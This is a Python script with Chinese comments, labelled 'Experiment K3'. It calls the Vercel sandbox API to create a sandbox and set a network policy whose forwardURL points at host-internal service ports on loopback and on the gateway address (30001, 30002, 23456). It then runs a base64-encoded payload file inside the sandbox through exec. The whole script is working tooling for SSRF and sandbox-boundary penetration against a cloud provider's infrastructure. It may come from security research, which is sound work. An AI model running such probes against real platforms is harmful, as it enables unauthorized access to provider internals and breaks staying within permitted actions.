# 实验K3: forwardURL -> 宿主内部服务面(30001/30002/23456) 网络边界穿透验证
# 前置事实(j92): 30001/30002/23456 监听 :: (全接口), 与沙箱共享 net ns, Go net/http 特征
# E5 缺口: forwardURL 矩阵只测 IMDS/网关/回环26661, 未测宿主自身服务端口
# 语义: 200+body=转发打通(拿到服务响应) / 502=代理侧TCP可达但TLS失败 / 503=拒绝 / 超时=drop
# 目标矩阵: 127.0.0.1(代理回环) + 网关64.64.0.1 + 对照 example.com
import json, base64, pathlib, urllib.request, urllib.error, time

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"
WH = "9c7f5951-b5cd-4b74-afeb-f62d92e457db"

def api(method, path, body=None, timeout=60):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

NAME = "expk3"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME,
            "networkPolicy": {"mode": "custom", "allowedDomains": ["webhook.site"]}})
print("create:", c)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid)

def run_round(label, fwd_url):
    print(f"\n########## {label}: {fwd_url} ##########", flush=True)
    c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/network-policy?teamId={TEAM}",
               {"allow": {"webhook.site": [{"match": {"path": {"exact": "/latest"}},
                                            "forwardURL": fwd_url}]}})
    if c != 200:
        print(f"update FAILED: {c} {r[:300]}", flush=True)
        return
    time.sleep(2)
    payload = base64.b64encode(pathlib.Path("exp_e5.py").read_bytes()).decode()
    body = {"command": "python3", "args": ["-c",
            f"import base64;exec(base64.b64decode('{payload}').decode())", "latest"],
            "wait": True, "logs": True, "timeout": 45000}
    c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
    print(f"cmd: {c}", flush=True)
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                print(d.get("data", ""), end="", flush=True)
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:300], flush=True)
    time.sleep(1)

# 对照组: 链路自检
run_round("K0-CTRL-PUBLIC", "https://example.com")
# 宿主服务面: 代理侧回环(服务监听 :: 全接口, 同宿主应可达)
run_round("K1-LOOP-30001", "https://127.0.0.1:30001")
run_round("K2-LOOP-30002", "https://127.0.0.1:30002")
run_round("K3-LOOP-23456", "https://127.0.0.1:23456")
# 网关侧(共享 net ns 的网关地址)
run_round("K4-GW-30001", "https://64.64.0.1:30001")
run_round("K5-GW-30002", "https://64.64.0.1:30002")
run_round("K6-GW-23456", "https://64.64.0.1:23456")
# http 变体是否被 API 接受(若 200 说明支持明文, 服务可能是纯 HTTP)
run_round("K7-LOOP-30001-H", "http://127.0.0.1:30001")
run_round("K8-LOOP-23456-H", "http://127.0.0.1:23456")

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
